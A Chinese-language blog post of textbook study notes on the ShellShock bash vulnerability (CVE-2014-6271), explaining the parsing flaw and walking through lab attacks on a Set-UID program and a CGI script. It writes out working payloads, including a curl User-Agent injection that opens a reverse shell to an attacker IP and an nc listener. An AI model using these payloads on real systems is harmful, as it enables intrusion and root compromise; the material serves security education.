《计算机安全导论：深度实践》第三章ShellShock

Created2023-10-17|Updated2023-10-17
|Post View:

一、背景知识：shell函数

1、shell命令解释器：

  • shell程序有两种概念，一种命令解释器，一种指shell脚本。
    • 命令解释器是交互式命令行解释器，允许用户与操作系统进行交互，执行命令，管理文件系统，启动程序等。
    • shell脚本是由shell脚本语言编写，由命令解释器解释执行的文本文件。
  • 有多种命令解释器：
    • Bourne Shell (sh)：
      • 1979年创建，是Unix的原始Shell。
      • 具有基本的命令解释功能，但功能有限，不常用。
    • C Shell (csh)：
      • 20世纪80年代初创建。
      • 使用C语言风格的语法，包括C风格的控制结构。
      • 提供了更多的交互性和可用性。
    • Korn Shell (ksh)：
      • 由David Korn创建，首次发布于1983年。
      • Ksh结合了sh和csh的特点，提供了更多的功能和可用性。
      • 主要用于商业环境和一些大型Unix系统。
    • Bourne Again Shell (bash)：
      • 1989年创建。
      • Bash是Bourne Shell的增强版本，是目前大多数Linux系统的默认Shell，最常用。
      • 具有丰富的功能，包括命令历史记录、自动补全、脚本编程等。
    • Z Shell (zsh)：
      • 首次发布于1990年。
      • 提供高度定制、自动补全、插件支持等功能。
      • 在用户友好性和交互性方面非常强大，被广泛用于Shell爱好者和开发者之间。
  • bash是使用最广泛的shell程序，bash中的shellshock漏洞主要与shell函数有关。

2、shell函数：

  • 在shell命令解释器中的shell函数：
    • 定义：函数名(){ 函数体 }，语法遵循shell编程语言
    • 调用：直接使用函数名
    • 查看函数定义：declare -f 函数名
    • 撤销函数：unset -f 函数名

  • 将父进程定义的shell函数传递给子进程：
  • 第一种方法，父shell定义函数后，直接使用export：export -f 函数名，此时子shell便可以使用函数
  • 第二种方法，父进程定义特殊内容的shell变量：
    • 父进程（不要求一定是shell进程）定义export foo=’() { echo “hello world”; }’ ，注意左大括号前后都要有空格
    • 显然由于单引号，父shell中的foo不是函数，而是一个字符串变量
    • 但是此时在子shell中分别进行foo变量和foo函数的使用，发现foo被识别为函数。
  • shell中单双引号的区别：
    • 无引号的字符串是最简单的形式，Shell 会将字符串按照空格和特定的分隔符（通常是空格等）进行分割，然后将其视为多个参数。
    • 单引号用于创建强引用字符串，其中的内容被视为纯文本，不会被解释或扩展。单引号内的特殊字符和变量不会被替换。
    • 双引号用于创建弱引用字符串，其中的变量和转义字符会被解释和扩展。

  • 第二种原理：

    • shell变量被export标记时会当做环境变量传递给子进程
    • 当子进程本是就是shell程序，不仅接收父进程的环境变量，还会将环境变量转换成相同的shell变量
    • 转换过程发现以括号()开头的环境变量，于是转换成一个shell函数，而非shell变量

  • 直接使用系统的bash测试第二种，发现无效，因为默认的bash已经打了补丁，不受shellshock影响：

  • 尝试使用教材提及的，未打补丁的bash_shellshock，发现并不存在，应该只有Ubuntu16.04有

  • 安装Ubuntu16.04

二、ShellShock漏洞：

  • bash中的安全漏洞，被称为ShellShock或者bashdoor，主要原因是bash处理环境变量为shell函数定义时犯得错误。
  • 最早于2014年9月24日被公开，编号CVE-2014-6271。
  • 原始漏洞被发现后，又发现一些类似的安全漏洞，统称为ShellShock漏洞。

1、漏洞描述：

  • 当子shell进程将某些环境变量转换成shell函数时，由于解析逻辑的漏洞，不仅会解析变量中的指令，可能还会执行变量中的指令。
  • 测试漏洞
  • 父进程定义：export foo=’() { echo “hello world”;}; echo “shellshock”; echo $$’ ，即函数结束后，使用分号，又加上了其他指令
  • 启动bash_shellshock
    • 发现自动执行了加上的指令，其中echo $$打印的0，说明应该子进程执行的？
    • 父进程pid=2519，子进程pid=2612
    • 并且在子shell进程中打印shell函数，发现没有后面加上的额外指令

2、bash的源码错误：

  • 源码variables.c文件中，bash进程在环境变量中找到值以() {开头时，会触发解析逻辑
  • 代码1中，检测环境变量的值是否以() {开头，若是则将原本环境变量中字符串的=替换成空格，即由”foo=() {}”变为”foo (){}”从而得到shell函数定义的字符串。
  • 代码2中，使用parse_and_execute函数解析前面得到的shell函数定义字符串，parse_and_execute函数功能强大，不仅可以解析函数定义，还可以解析和执行shell指令。

  • 当shell函数定义使用了;分隔时，parse_and_execute函数会识别为多个shell指令，第一个为定义shell函数的shell指令，其余的则可以是任意指令、
  • parse_and_execute函数本质上是从字符串中识别shell指令，然后执行shell指令。正常情况下得到的是函数定义的shell指令，所以可以完成将环境变量转成函数定义的功能。但是又不仅识别一条指令，所以导致了shellshock

3、shellshock漏洞利用：

  • 两个条件：
    • 目标进程运行bash
    • 攻击者能通过环境变量向目标进程传递数据

三、攻击Set-UID程序：

  • 当Set-UID程序通过system函数调用外部程序时，可以设置环境变量进行shellshock进行攻击。
  • shellshockSystem.c函数，编译，设为root的Set-UID程序

  • 设置环境变量：export foo=’() { echo “hello world”;}; /bin/sh;’
  • 设置软连接：sudo ln -sf /bin/bash_shellshock /bin/sh，改回原连接：sudo ln -cf /bin/dash /bin/sh
  • 执行shellshockSystem，发现获得的只是seed的shell

  • 发现问题原因，geteuid写成了getuid，修正后再次测试，成功得到root的shell

  • 说明setuid(geteuid())能将RUID也设为root，能改变进程RUID还是比较神奇的
  • setuid(uid)执行的情况：《UNIX环境高级编程》
    • 若进程具有超级用户权限即root，则setuid将RUID、EUID、SUID设置为uid
    • 若进程没有超级用户权限，但uid等于RUID或SUID，则setuid只将EUID设置为uid，不改变RUID和SUID
    • 若以上条件不满足，返回-1，errno设为EPERM

四、攻击CGI程序：

1、CGI程序：

  • CGI（Common Gateway Interface）是一种用于在Web服务器和应用程序之间传递信息的标准协议。

  • CGI程序是一种用于Web服务器的脚本或可执行程序

    • Web服务器接收到用户客户端的http请求（需要CGI程序处理的请求）
    • Web服务器启动CGI程序的一个新进程
    • Web服务器将http请求的参数传递给该CGI进程
    • CGI程序进行处理（生成动态网页或者其他操作），将内容返回给Web服务器
    • Web服务器再将内容发送给用户客户端。

  • 编写语言：CGI程序可以使用各种编程语言编写，包括但不限于Perl、Python、C、C++、Shell脚本等。这些程序通常根据特定的请求生成HTML页面、处理表单数据、与数据库交互等。

  • URL路径：CGI程序通常通过URL的路径来调用，例如 http://example.com/cgi-bin/mycgi.pl，其中 /cgi-bin/ 是Web服务器配置的CGI脚本目录，mycgi.pl 是CGI程序的文件名。

  • 安全性考虑：由于CGI程序可以执行任意代码，因此必须非常小心，以确保安全性。不正确的CGI程序可能会导致安全漏洞，因此开发和配置CGI程序需要遵循安全最佳实践。

  • 尽管CGI在过去非常流行，但它已经被更高效和更安全的技术取代，例如服务器端脚本语言（如PHP、Python、Node.js）和Web框架。这些技术通常可以更有效地处理HTTP请求和生成动态内容，而无需像CGI那样启动新的进程。

  • 以下是一些区分服务器端脚本语言和CGI程序的关键区别：

    1. 执行方式：
      • CGI程序：每次接收到HTTP请求时，Web服务器都会启动一个新的进程来运行CGI程序。
      • 服务器端脚本语言：通常以持久化的方式运行在Web服务器内部，例如作为一个模块或一个进程池的一部分。它们可以处理多个请求，而不需要在每次请求时启动新的进程。
    2. 资源共享：
      • CGI程序：每个CGI请求都在独立的进程中运行，不容易共享数据或状态。
      • 服务器端脚本语言：它们通常可以更容易地共享状态和数据，因为它们可以在持久化的环境中运行。

  • 使用shell脚本实现CGI程序：

    • Web服务器会接受CGI标准输出的内容，作为响应客户端的内容，主要是响应头和响应体
    • 响应头与响应体使用空行区分即可
    • 标准输出使用echo即可

  • 两台虚拟机

  • 攻击机curl命令，发送http请求：curl http://10.0.2.4/cgi-bin/test.cgi，发现成功返回了

3、调用CGI程序流程：

  • Web服务器会判断请求是否是CGI请求（根据url是否是CGI程序路径？）
  • 是，则fork一个子进程，使用exec函数族，载入CGI程序
  • 因为CGI程序是shell脚本语言，开头的若是#!/bin/bash，则exec实际上执行了/bin/bash，再由bash进程解析shell指令，此时符合条件一，触发bash
  • Apache服务器fork子进程时，再通过exec调用bash时，均有环境变量传递，符合条件二
  • 探明传递的环境变量，testEnv.cgi，进行相应权限设置

  • 攻击机访问：curl http://10.0.2.4/cgi-bin/testEnv.cgi，成功响应

  • 观察curl的请求头和返回的响应体中的环境变量：有多处有相同的值，但是考虑到http的正常通信，User-Agent是最适合作为攻击点的，也可以寻找其他不影响通信的参数。

5、反弹shell：

  • 反向shell：
    • 让shell程序的输入和输出都交由远程计算机用户控制
    • 关键在于让shell的标准输入和输出都重定向到一个网络连接
  • net cat（nc）:
    • 运行一个TCP服务器，能将客户端的输入打印出来，并将本地输入，发送给客户端
  • 攻击者：nc -lvnp 9090，启动服务器，并监听9090端口，教材的-lv报错

  • 反弹shell指令：/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
    • /bin/bash -i ，交互模式下启动bash，此时会提供提示符
    • >/dev/tcp/10.0.2.15/9090，表示前面的bash程序的标准输出1被重定向到TCP网络连接，会将shell的输出发送到TCP连接。
    • 0<&1，标准输入0重定向到标准输出1，即输出也被用作输入，输出已被重定向到TCP连接，所以会从TCP连接中获得输入。
    • 2>&1，将标准错误输出2重定向到标准输出1。1已经重定向到TCP连接，故将shell错误信息发送到TCP连接
  • 攻击者利用shellshock执行反弹shell：curl -A “() { echo hello;};echo Cotent-type:text/plain;echo;/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1” http://10.0.2.4/cgi-bin/normal.cgi

  • 0<&1：
    • 这个重定向操作表示将标准输入（文件描述符0）重定向到标准输出（文件描述符1）。换句话说，它将进程的输入流与输出流连接起来，使得从标准输入读取的内容实际上是从标准输出中获取的内容。
  • 1>&0：
    • 这个重定向操作表示将标准输出（文件描述符1）重定向到标准输入（文件描述符0）。它将进程的输出流与输入流连接起来，使得进程输出的内容实际上成为进程的输入。这通常用于将一个命令的输出传递给另一个命令作为输入。

  • 触发bash：PHP中的system函数与c的类似，都使用/bin/sh执行命令

  • 用户控制环境变量：

    • 以CGI程序运行，此时的情况与shell程序类似
    • 根据用户输入设置了环境变量，然后再用system调用外部程序
